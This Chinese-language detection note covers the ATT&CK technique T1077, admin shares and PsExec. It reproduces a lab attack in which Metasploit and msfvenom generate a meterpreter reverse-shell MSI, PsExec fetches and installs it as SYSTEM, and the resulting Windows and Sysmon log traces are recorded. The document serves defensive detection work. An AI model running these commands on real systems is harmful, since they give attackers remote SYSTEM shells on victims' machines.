# T1077-win-基于白名单PsExec执行payload

## 来自ATT&CK的描述

Windows系统具有只能由管理员访问的隐藏网络共享，并提供远程文件复制和其他管理功能。例如网络共享包括`C$`，`ADMIN$`，和`IPC$`。攻击者可以将此技术与具有管理员权限级别的帐户结合使用，通过服务器消息块（SMB）远程访问联网系统，以便使用远程过程调用（RPC），传输文件。攻击者还可以使用NTLM哈希来访问具有Pass Hash和某些配置和补丁级别的系统上的管理员共享。

Windows使用SMB服务，允许通过端口445/tcp进行文件传输和打印机共享。它允许枚举，读取和写入远程计算机的文件共享目录。虽然Windows服务器大量使用它来用于合法用途，并且允许用户用于文件和打印机共享，但许多攻击者也可以使用SMB来实现[横向移动](https://attack.mitre.org/tactics/TA0008)。你需要密切地观察这一活动并感知到威胁的存在。由于SMB流量在许多环境中都非常重要，因此分析攻击者在内网中利用SMB进行横向移动的非法行为变得十分复杂。

## 测试案例

微软于2006年7月收购sysinternals公司，PsExec是SysinternalsSuite的小工具之一，是一种轻量级的telnet替代品，允许在其他系统上执行进程，完成控制台应用程序的完全交互，而无需手动安装客户端软件，并且可以获得与控制台应用程序相当的完全交互性。

微软官方文档：

<https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec>

说明：PsExec.exe没有默认安装在windows系统。

补充说明：在高版本操作系统中，可以通过配置策略，对进程命令行参数进行记录。日志策略开启方法：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`，同样也可以在不同版本操作系统中部署sysmon，通过sysmon日志进行监控。

## 检测日志

windows 安全日志（需要自行配置）

## 测试复现

### 环境准备

攻击机：Kali2019

靶机：win7（sysmon日志）

### 攻击分析

#### 配置MSF

```bash
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.126.146
lhost => 192.168.126.146
msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) > exploit
```

#### 生成payload

```bash
msfvenom -a  x86 --platform windows -p  windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f msi > shellcode.msi
```

#### 靶机执行

注意：需要管理员权限

```dos
PsExec.exe -d -s msiexec.exe /q /i http://192.168.126.146/shellcode.msi
```

#### 反弹shell

```bash
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.126.146:4444
[*] Sending stage (180291 bytes) to 192.168.126.149
[*] Meterpreter session 1 opened (192.168.126.146:4444 -> 192.168.126.149:49371) at 2020-04-18 23:09:44 +0800

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > getpid
Current pid: 2352
```

## 测试留痕

```log
windows 安全日志
EventID： 4688
进程信息:
新进程 ID: 0xe84
新进程名: C:\Users\12306Br0\Desktop\PSTools\PsExec.exe

EventID： 4688
进程信息:
新进程 ID: 0xfcc
新进程名: C:\Windows\PSEXESVC.exe

EVentID：5140
网络信息:
对象类型: File
源地址: fe80::719e:d312:648f:4884
源端口: 49369
共享信息:
共享名: \\*\IPC$

EventID：5145
网络信息:
对象类型: File
源地址: fe80::719e:d312:648f:4884
源端口: 49369

共享信息:
共享名称: \\*\IPC$
共享路径:
相对目标名称: PSEXESVC

SYSMON日志
EventID：1
Process Create:
RuleName:
UtcTime: 2020-04-18 15:09:29.237
ProcessGuid: {bb1f7c32-1829-5e9b-0000-00107a844001}
ProcessId: 3716
Image: C:\Users\12306Br0\Desktop\PSTools\PsExec.exe
FileVersion: 2.2
Description: Execute processes remotely
Product: Sysinternals PsExec
Company: Sysinternals - www.sysinternals.com
OriginalFileName: psexec.c
CommandLine: PsExec.exe  -d -s msiexec.exe /q /i http://192.168.126.146/shellcode.msi
CurrentDirectory: C:\Users\12306Br0\Desktop\PSTools\
User: 12306Br0-PC\12306Br0
LogonGuid: {bb1f7c32-5fc3-5e99-0000-0020eae10600}
LogonId: 0x6e1ea
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=E50D9E3BD91908E13A26B3E23EDEAF577FB3A095
ParentProcessGuid: {bb1f7c32-1806-5e9b-0000-001070474001}
ParentProcessId: 3492
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: "C:\Windows\System32\cmd.exe"

EventID：1
Process Create:
RuleName:
UtcTime: 2020-04-18 15:09:29.284
ProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001}
ProcessId: 4044
Image: C:\Windows\PSEXESVC.exe
FileVersion: 2.2
Description: PsExec Service
Product: Sysinternals PsExec
Company: Sysinternals
OriginalFileName: psexesvc.exe
CommandLine: C:\Windows\PSEXESVC.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=A17C21B909C56D93D978014E63FB06926EAEA8E7
ParentProcessGuid: {bb1f7c32-a6a0-5e60-0000-001025ae0000}
ParentProcessId: 496
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe

EventID：1
Process Create:
RuleName:
UtcTime: 2020-04-18 15:09:29.440
ProcessGuid: {bb1f7c32-1829-5e9b-0000-00103c894001}
ProcessId: 1916
Image: C:\Windows\System32\msiexec.exe
FileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)
Description: Windows® installer
Product: Windows Installer - Unicode
Company: Microsoft Corporation
OriginalFileName: msiexec.exe
CommandLine: "msiexec.exe" /q /i http://192.168.126.146/shellcode.msi
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD
ParentProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001}
ParentProcessId: 4044
ParentImage: C:\Windows\PSEXESVC.exe
ParentCommandLine: C:\Windows\PSEXESVC.exe
```

由于sysmon配置问题，只对进程创建行为进行监控

## 检测规则/思路

无具体检测规则，可根据PsExec特征进行检测。

## 参考推荐

MITRE-ATT&CK-T1077

<https://attack.mitre.org/techniques/T1077/>

基于白名单PsExec执行payload

<https://blog.csdn.net/ws13129/article/details/89879771>
